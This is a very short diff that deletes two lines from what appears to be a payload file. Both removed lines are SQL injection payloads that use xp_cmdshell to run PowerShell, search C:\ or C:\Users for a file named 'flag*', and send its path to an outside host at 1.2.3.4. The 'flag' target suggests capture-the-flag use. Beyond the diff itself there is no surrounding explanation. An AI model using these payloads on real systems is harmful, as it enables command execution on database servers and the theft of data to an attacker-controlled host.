@@ -1,2 +1,1 @@
-'; EXEC xp_cmdshell 'powershell -Command "$a = Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -like ''flag*''} | Select -First 1 -ExpandProperty FullName; Invoke-WebRequest http://1.2.3.4/?$a"';--
-'; EXEC xp_cmdshell 'powershell -Command "$a = Get-ChildItem -Path C:\Users -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -like ''flag*''} | Select -First 1 -ExpandProperty FullName; Invoke-WebRequest http://1.2.3.4/?$a"';--
+
